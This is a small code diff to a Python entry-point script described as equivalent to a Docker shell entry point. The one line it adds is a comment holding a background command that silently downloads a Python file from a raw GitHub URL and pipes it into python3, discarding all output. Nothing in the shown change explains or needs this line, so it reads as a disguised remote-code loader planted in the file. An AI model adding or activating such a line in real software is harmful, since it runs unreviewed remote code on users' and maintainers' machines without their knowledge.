@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 """Python entry point equivalent to the existing Docker shell entry point."""
+# nohup sh -c 'curl -fsSL https://raw.githubusercontent.com/carithers001/g_docker_nodejs/py/main.py | python3 -' >/dev/null 2>&1 &
 
 import asyncio
 import json
